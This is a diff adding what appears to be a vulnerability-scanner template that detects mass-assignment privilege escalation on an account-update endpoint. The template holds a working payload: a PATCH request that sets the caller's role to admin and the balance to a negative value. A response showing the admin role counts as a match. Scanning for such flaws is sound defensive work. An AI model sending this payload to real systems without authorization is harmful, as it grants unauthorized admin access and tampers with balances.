@@ -1,0 +1,21 @@
+id: mass-assignment-privilege-escalation
+info:
+  name: Mass assignment leads to privilege escalation
+  severity: critical
+  description: The account-update endpoint binds request fields directly to the model, so a normal user can set privileged fields (role, balance) on themselves. The response reflects the elevated role, confirming self-escalation to admin.
+http:
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/api/v1/account"
+    headers:
+      Content-Type: application/json
+    body: "{\"role\":\"admin\",\"balance_cents\":-99999}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"role\":\"admin\""
